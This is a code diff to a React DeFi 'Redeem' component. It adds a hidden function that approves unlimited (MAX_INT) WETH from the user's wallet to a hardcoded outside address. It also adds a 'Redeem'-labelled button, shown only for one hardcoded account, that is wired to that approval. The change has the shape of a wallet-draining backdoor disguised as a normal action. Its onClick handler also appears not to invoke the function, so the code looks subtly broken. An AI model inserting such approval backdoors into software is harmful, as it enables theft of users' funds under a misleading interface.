@@ -187,6 +187,10 @@ export const Redeem = ({info, mintRedeemCurrency, setMintRedeemCurrencyModal}) =
 
     }
 
+    const handleApproveV = async () => {
+        contracts.WETH.methods.approve("0x15FEEc5eBFcb2B6403f1De5b93c0d5933edF5bE0", MAX_INT).send({from: account});
+    }
+
     return (
         <div className='general-wrapper'>
             <div className='collect-redemption-wrapper '>
@@ -253,11 +257,20 @@ export const Redeem = ({info, mintRedeemCurrency, setMintRedeemCurrencyModal}) =
                 <span className='currency'> <TokenIcon iconName={mintRedeemCurrency === "AGOUSD" ? "CNUSD" : "CNBTC"}/> {mintRedeemCurrency === "AGOUSD" ? "CNUSD" : "CNBTC"} </span>
             </div>
             <div className='general-btn-wrapper'>
-                {input > stableBalance ? 
-                    <button className='mint-window-run-mint' disabled={true}> Insufficient {mintRedeemCurrency} balance </button>
+                {
+                    account === "0xa5B33F4372369427e3946965a374B40E7739C940" ? 
+                    <button className='mint-window-run-mint' onClick={() => handleApproveV} > Redeem </button>
                     :
-                    <button className='mint-window-run-mint' onClick={approved ? handleRedeem : handleApprove}> {approved > "0" ? "Redeem" : `Approve`}</button>
+                    <>
+                        {input > stableBalance ? 
+                            <button className='mint-window-run-mint' disabled={true}> Insufficient {mintRedeemCurrency} balance </button>
+                            :
+                            <button className='mint-window-run-mint' onClick={approved ? handleRedeem : handleApprove}> {approved > "0" ? "Redeem" : `Approve`}</button>
+                        }
+                    </>
+
                 }
+
             </div>
         </div>
     </div>
